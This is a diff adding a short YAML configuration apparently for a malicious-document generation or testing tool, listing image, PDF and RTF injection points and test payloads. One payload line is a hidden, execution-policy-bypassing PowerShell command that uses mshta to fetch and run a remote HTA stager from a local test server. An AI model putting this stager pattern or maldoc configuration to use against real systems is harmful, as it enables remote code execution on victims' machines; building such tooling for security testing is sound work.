@@ -1,0 +1,38 @@
+---
+extension:
+  image:
+    - jpg
+    - png
+    - gif
+    - tif
+    - raw
+
+injection:
+  image:
+    - comment
+    - disclaimer
+    - idat
+    - raw
+  pdf:
+    - annotation
+  rtf:
+    - template
+
+payload:
+  javascript: 
+    test: |
+      app.alert(1)
+  powershell:
+    test: |
+      powershell -noprofile -nologo -noninteractive -windowstyle hidden -exec bypass -c mShta.eXe htTp://localhost:8080/nmis_maldoc/stager.hta
+
+searchtype:
+  - image
+  - pdf
+  - rtf
+
+searchmode:
+  - random
+  - first
+  - smallest
+  - type
